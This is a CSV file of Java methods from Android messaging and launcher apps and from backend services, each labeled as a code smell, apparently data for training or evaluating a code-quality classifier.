text,label,text_label
"private TLRPC.TL_messages_stickerSet getCachedStickerSetInternal(long id,Integer hash){
  TLRPC.TL_messages_stickerSet set=null;
  SQLiteCursor cursor=null;
  NativeByteBuffer data=null;
  try {
    cursor=getMessagesStorage().getDatabase().queryFinalized(""SELECT data, hash FROM stickersets WHERE id = "" + id + "" LIMIT 1"");
    if (cursor.next() && !cursor.isNull(0)) {
      data=cursor.byteBufferValue(0);
      if (data != null) {
        set=TLRPC.TL_messages_stickerSet.TLdeserialize(data,data.readInt32(false),false);
        int cachedHash=cursor.intValue(1);
        if (hash != null && hash != 0 && hash != cachedHash) {
          return null;
        }
      }
    }
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
 finally {
    if (data != null) {
      data.reuse();
    }
    if (cursor != null) {
      cursor.dispose();
    }
  }
  return set;
}",1,Code Smell
"public void onDragEnter(ItemInfo dragInfo){
  if (mFolder.isDestroyed() || !willAcceptItem(dragInfo))   return;
  CellLayoutLayoutParams lp=(CellLayoutLayoutParams)getLayoutParams();
  CellLayout cl=(CellLayout)getParent().getParent();
  mBackground.animateToAccept(cl,lp.getCellX(),lp.getCellY());
  mOpenAlarm.setOnAlarmListener(mOnOpenListener);
  if (SPRING_LOADING_ENABLED && ((dragInfo instanceof WorkspaceItemFactory) || (dragInfo instanceof WorkspaceItemInfo) || (dragInfo instanceof PendingAddShortcutInfo))) {
    mOpenAlarm.setAlarm(ON_OPEN_DELAY);
  }
}
",1,Code Smell
"/** 
 * Book broker report info
 * @param isRegister         request method
 * @param isOnline           if broker is ready
 * @param repConfigId        report configure id
 * @param repCheckSumId      report configure check sum
 * @param isTackData         if tack data in request
 * @param repBrokerConfInfo  tacked broker configure
 * @param repTopicConfs      tacked topic configure
 * @param sBuffer            string process container
 */
public void bookBrokerReportInfo(boolean isRegister,boolean isOnline,long repConfigId,int repCheckSumId,boolean isTackData,String repBrokerConfInfo,List<String> repTopicConfs,StringBuilder sBuffer){
  this.isOnline=isOnline;
  boolean isSynchronized=brokerSyncData.bookBrokerReportInfo(brokerInfo,repConfigId,repCheckSumId,isTackData,repBrokerConfInfo,repTopicConfs);
  if (isRegister && isOnline && isTackData) {
    Tuple2<ManageStatus,Map<String,TopicInfo>> syncData=brokerSyncData.getBrokerPublishInfo();
    brokerRunManager.iniBrokerConfInfo(brokerInfo.getBrokerId(),syncData.getF0(),syncData.getF1());
  }
  goNextStatus(isRegister,isSynchronized,sBuffer);
}",1,Code Smell
"@Override public void sendMessageToClient(ChannelInfo clientChannelInfo,String targetClient,WebSocketFrame message,EventContext context){
  String workspaceId=clientChannelInfo.getWorkspaceId();
  try {
    Map<String,ChannelInfo> sessionGroup;
    if (context.isBroadcast()) {
      sessionGroup=sessionService.getSessionMap(workspaceId);
    }
 else {
      sessionGroup=sessionService.getSessionGroup(workspaceId,targetClient);
    }
    if (sessionGroup != null) {
      for (      ChannelInfo channelInfo : sessionGroup.values()) {
        if (workspaceId.equals(channelInfo.workspaceId) && (channelInfo.channelType.equals(ChannelType.CLIENT) || channelInfo.channelType.equals(ChannelType.API))) {
          channelInfo.channel.writeAndFlush(message.copy());
        }
      }
    }
  }
  finally {
    message.release();
  }
}
",1,Code Smell
"@Override public void systemAboutToSleep(SystemSleepEvent e){
  if (AppPrefs.get() != null && AppPrefs.get().lockVaultOnHibernation().get() && AppPrefs.get().getLockCrypt().get() != null && !AppPrefs.get().getLockCrypt().get().isBlank()) {
    ThreadHelper.runAsync(() -> {
      ThreadHelper.sleep(1000);
      OperationMode.close();
    }
);
  }
}",1,Code Smell
"public DevicePaddings(Context context,int devicePaddingId){
  try (XmlResourceParser parser=context.getResources().getXml(devicePaddingId)){
    final int depth=parser.getDepth();
    int type;
    while (((type=parser.next()) != XmlPullParser.END_TAG || parser.getDepth() > depth) && type != XmlPullParser.END_DOCUMENT) {
      if ((type == XmlPullParser.START_TAG) && DEVICE_PADDINGS.equals(parser.getName())) {
        final int displayDepth=parser.getDepth();
        while (((type=parser.next()) != XmlPullParser.END_TAG || parser.getDepth() > displayDepth) && type != XmlPullParser.END_DOCUMENT) {
          if ((type == XmlPullParser.START_TAG) && DEVICE_PADDING.equals(parser.getName())) {
            TypedArray a=context.obtainStyledAttributes(Xml.asAttributeSet(parser),R.styleable.DevicePadding);
            int maxWidthPx=a.getDimensionPixelSize(R.styleable.DevicePadding_maxEmptySpace,0);
            a.recycle();
            PaddingFormula workspaceTopPadding=null;
            PaddingFormula workspaceBottomPadding=null;
            PaddingFormula hotseatBottomPadding=null;
            final int limitDepth=parser.getDepth();
            while (((type=parser.next()) != XmlPullParser.END_TAG || parser.getDepth() > limitDepth) && type != XmlPullParser.END_DOCUMENT) {
              AttributeSet attr=Xml.asAttributeSet(parser);
              if ((type == XmlPullParser.START_TAG)) {
                if (WORKSPACE_TOP_PADDING.equals(parser.getName())) {
                  workspaceTopPadding=new PaddingFormula(context,attr);
                }
 else                 if (WORKSPACE_BOTTOM_PADDING.equals(parser.getName())) {
                  workspaceBottomPadding=new PaddingFormula(context,attr);
                }
 else                 if (HOTSEAT_BOTTOM_PADDING.equals(parser.getName())) {
                  hotseatBottomPadding=new PaddingFormula(context,attr);
                }
              }
            }
            if (workspaceTopPadding == null || workspaceBottomPadding == null || hotseatBottomPadding == null) {
              if (Utilities.IS_DEBUG_DEVICE) {
                throw new RuntimeException(""DevicePadding missing padding."");
              }
            }
            DevicePadding dp=new DevicePadding(maxWidthPx,workspaceTopPadding,workspaceBottomPadding,hotseatBottomPadding);
            if (dp.isValid()) {
              mDevicePaddings.add(dp);
            }
 else {
              Log.e(TAG,""Invalid device padding found."");
              if (Utilities.IS_DEBUG_DEVICE) {
                throw new RuntimeException(""DevicePadding is invalid"");
              }
            }
          }
        }
      }
    }
  }
 catch (  IOException|XmlPullParserException e) {
    Log.e(TAG,""Failure parsing device padding layout."",e);
    throw new RuntimeException(e);
  }
  mDevicePaddings.sort((sl1,sl2) -> Integer.compare(sl1.maxEmptySpacePx,sl2.maxEmptySpacePx));
}",1,Code Smell
"@Override public void checkRepeatData(CfCarParkLinkUser cfCarParkLinkUser){
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(cfCarParkLinkUser.getUid());
  cfCarParkLinkUserQuery.setCarParkId(cfCarParkLinkUser.getCarParkId());
  cfCarParkLinkUserQuery.setPage(1);
  cfCarParkLinkUserQuery.setSize(1);
  List<CfCarParkLinkUser> cfCarParkLinkUsers=getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    if ((StringUtils.isNotEmpty(cfCarParkLinkUser.getId()) && !cfCarParkLinkUsers.get(0).getId().equals(cfCarParkLinkUser.getId())) || StringUtils.isEmpty(cfCarParkLinkUser.getId())) {
      ExceptionCast.cast(CommonCode.DUPLICATE_DATA);
    }
  }
}",1,Code Smell
"private void checkDone(boolean animated){
  if (doneButton == null)   return;
  final boolean hasChanges=hasChanges();
  doneButton.setEnabled(hasChanges);
  if (animated) {
    doneButton.animate().alpha(hasChanges ? 1.0f : 0.0f).scaleX(hasChanges ? 1.0f : 0.0f).scaleY(hasChanges ? 1.0f : 0.0f).setDuration(180).start();
  }
 else {
    doneButton.setAlpha(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleX(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleY(hasChanges ? 1.0f : 0.0f);
  }
  if (listView != null && listView.adapter != null && clearVisible != (currentLocation != null && (geo != null || !TextUtils.isEmpty(address)))) {
    listView.adapter.update(true);
  }
}",1,Code Smell
"@Override public View createView(Context context){
  View rootView=super.createView(context);
  resetHeader(false);
  DefaultItemAnimator defaultItemAnimator=new DefaultItemAnimator();
  defaultItemAnimator.setSupportsChangeAnimations(false);
  defaultItemAnimator.setDelayAnimations(false);
  listView.setItemAnimator(defaultItemAnimator);
  listView.setOnItemClickListener((view,position) -> {
    if (view instanceof GiftedUserCell) {
      GiftedUserCell cell=(GiftedUserCell)view;
      TL_stories.TL_boost boost=cell.getBoost();
      if (((boost.gift || boost.giveaway) && boost.user_id >= 0) || boost.unclaimed) {
        TLRPC.TL_payments_checkedGiftCode giftCode=new TLRPC.TL_payments_checkedGiftCode();
        giftCode.giveaway_msg_id=boost.giveaway_msg_id;
        giftCode.to_id=boost.user_id;
        giftCode.from_id=MessagesController.getInstance(UserConfig.selectedAccount).getPeer(-currentChat.id);
        giftCode.date=boost.date;
        giftCode.via_giveaway=boost.giveaway;
        giftCode.months=(boost.expires - boost.date) / 30 / 86400;
        if (boost.unclaimed) {
          giftCode.to_id=NO_USER_ID;
          giftCode.flags=-1;
        }
 else {
          giftCode.boost=boost;
        }
        new GiftInfoBottomSheet(this,false,true,giftCode,boost.used_gift_slug).show();
      }
 else       if (boost.giveaway && boost.user_id == NO_USER_ID) {
        final Bulletin.LottieLayout layout=new Bulletin.LottieLayout(getParentActivity(),getResourceProvider());
        layout.setAnimation(R.raw.chats_infotip,36,36);
        layout.textView.setText(LocaleController.getString(""BoostingRecipientWillBeSelected"",R.string.BoostingRecipientWillBeSelected));
        layout.textView.setSingleLine(false);
        layout.textView.setMaxLines(2);
        Bulletin.make(this,layout,Bulletin.DURATION_LONG).show();
      }
 else       if (!boost.gift && !boost.giveaway) {
        presentFragment(ProfileActivity.of(cell.getDialogId()));
      }
    }
    if (view instanceof TextCell) {
      BoostPagerBottomSheet.show(this,dialogId,resourceProvider);
    }
    if (view instanceof GiveawayCell) {
      BoostPagerBottomSheet.show(this,resourceProvider,dialogId,((GiveawayCell)view).getPrepaidGiveaway());
    }
    if (items.get(position).viewType == SHOW_MORE_VIEW_TYPE) {
      loadUsers(selectedTab == TAB_GIFTS);
    }
  }
);
  createEmptyView(getContext());
  loadStatistic();
  updateRows(false);
  return rootView;
}",1,Code Smell
"@Override public View focusSearch(View focused,int direction){
  if (focused != null) {
    View found=FocusFinder.getInstance().findNextFocus(this,focused,direction);
    if (direction == View.FOCUS_LEFT || direction == View.FOCUS_RIGHT) {
      if ((found == null || found.getId() != R.id.text) && getScrollState() == SCROLL_STATE_IDLE) {
        focused.clearAnimation();
        focused.startAnimation(shake);
        return null;
      }
    }
  }
  return super.focusSearch(focused,direction);
}
",1,Code Smell
